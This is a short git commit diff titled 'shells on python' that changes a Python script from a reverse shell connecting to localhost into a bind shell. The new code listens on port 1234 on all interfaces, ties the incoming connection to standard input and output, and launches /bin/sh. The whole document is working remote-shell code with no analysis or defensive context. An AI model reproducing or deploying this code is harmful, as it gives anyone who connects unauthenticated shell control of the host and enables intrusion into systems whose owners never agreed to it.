8298626b912a2a8a58bdfdcd21afbf2a3c6b9d42
Ruslan.Kutdusov <ruslan.kutdusov.usu@gmail.com>
2014-12-23 21:58:39 +0500

    shells on python

--- listeningShell.py
+++ listeningShell.py
@@ -1,10 +1,13 @@
 import sys, socket, subprocess, os
 
-host = "127.0.0.1"
 port = 1234
 
-conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-conn.connect((host, port))
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+sock.bind(('', port))
+sock.listen(1)
+
+conn, addr = sock.accept()
 
 os.dup2(conn.fileno(), 0)
 os.dup2(conn.fileno(), 1)
@@ -12,3 +15,4 @@ os.dup2(conn.fileno(), 2)
 os.execl( "/bin/sh", "sh" );
 
 conn.close()
+sock.close()
